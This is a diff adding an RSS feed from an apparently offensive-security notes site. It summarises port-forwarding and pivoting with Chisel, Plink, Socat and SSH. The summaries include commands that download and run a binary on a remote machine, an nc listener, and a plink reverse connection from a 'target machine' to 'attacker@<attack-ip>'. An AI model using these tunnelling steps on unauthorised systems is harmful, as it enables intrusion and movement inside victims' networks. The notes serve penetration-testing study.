@@ -1,0 +1,40 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Port Forwarding on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/network/port-forwarding/</link>
+    <description>Recent content in Port Forwarding on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 16:14:27 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/network/port-forwarding/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Port Forwarding with Chisel</title>
+      <link>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-chisel/</link>
+      <pubDate>Sat, 20 May 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-chisel/</guid>
+      <description>Transfer Chisel Binary to Remote Machine linkIf the remote machine does not have chisel binary, we need to transfer it from local machine (if local machine has the binary).&#xA;# In local machine python3 -m http.server --directory /path/to/chisel/directory # In remote machine wget http://&amp;lt;local-ip&amp;gt;:8000/chisel chmod &amp;#43;x chisel ./chisel -h Port Forwarding link # In remote machine chisel server -p &amp;lt;listen-port&amp;gt; # In local machine chisel client &amp;lt;listen-ip&amp;gt;:&amp;lt;listen-port&amp;gt; &amp;lt;local-port&amp;gt;:&amp;lt;target-ip&amp;gt;:&amp;lt;target-port&amp;gt; Reverse Port Forwarding linkIt is useful when we want to access to the host &amp;amp; the port that cannot be directly accessible from local machine.</description>
+    </item>
+    <item>
+      <title>Port Forwarding with Plink</title>
+      <link>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-plink/</link>
+      <pubDate>Sun, 19 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-plink/</guid>
+      <description>Reverse Connection link1. Open Lisnter in Your Local Machine link nc -lvnp 4444 2. Run Reverse Connection in Target Machine linkFirst of all, generate SSH keys. Two keys (public and private) will be generated.&#xA;ssh-keygen Convert the private key for Windows.&#xA;puttygen private_key -o private_key.ppk Run reverse connection using plink.&#xA;cmd.exe /c echo y | .\plink.exe -R &amp;lt;attack-port&amp;gt;:&amp;lt;victim-ip&amp;gt;:&amp;lt;victim-port&amp;gt; attacker@&amp;lt;attack-ip&amp;gt; -i private_key.ppk -N </description>
+    </item>
+    <item>
+      <title>Port Forwarding with Socat</title>
+      <link>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-socat/</link>
+      <pubDate>Sun, 19 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-socat/</guid>
+      <description>Port Forwarding linkRun the following command in local machine.&#xA;socat tcp-listen:8080,fork tcp:&amp;lt;remote-ip&amp;gt;:80 With command above, we can access to http://localhost:8080/ and get the content of the remote website.&#xA;Port Forwarding (from Remote Machine) linkRun the following command in remote machine.&#xA;socat tcp-listen:1234,fork,reuseaddr tcp:localhost:8080 With command above, we can access to http://&amp;lt;remote-ip&amp;gt;:1234 in local machine, and get the content of the remote 8080 port.&#xA;Quiet Port Forwarding link1. Open Up Two Ports in Local Machine link socat tcp-listen:&amp;lt;local-port&amp;gt; tcp-listen:&amp;lt;remote-port&amp;gt;,fork,reuseaddr &amp;amp; 2.</description>
+    </item>
+    <item>
+      <title>Port Forwarding with SSH</title>
+      <link>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-ssh/</link>
+      <pubDate>Sun, 19 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/port-forwarding/port-forwarding-with-ssh/</guid>
+      <description>Local Port Forwarding linkWe can forward a port on the local machine to a port on the remote machine by adding the flag &amp;quot;-L&amp;quot; with SSH.&#xA;Also, it is required the remote SSH username/password.&#xA;ssh -L [&amp;lt;local-ip&amp;gt;:]&amp;lt;local-port&amp;gt;.&amp;lt;destination-ip&amp;gt;:&amp;lt;destination-port&amp;gt; remote-user@&amp;lt;remote-ip&amp;gt; # -f: Background # -N Do not execute remote commands ssh -L [&amp;lt;local-ip&amp;gt;:]&amp;lt;local-port&amp;gt;:&amp;lt;destination-ip&amp;gt;:&amp;lt;destination-port&amp;gt; remote-user@&amp;lt;remote-ip&amp;gt; -fN Examples linkBelow are some examples.&#xA;# We can access the internal webserver in the remote machin via http://127.</description>
+    </item>
+  </channel>
+</rss>
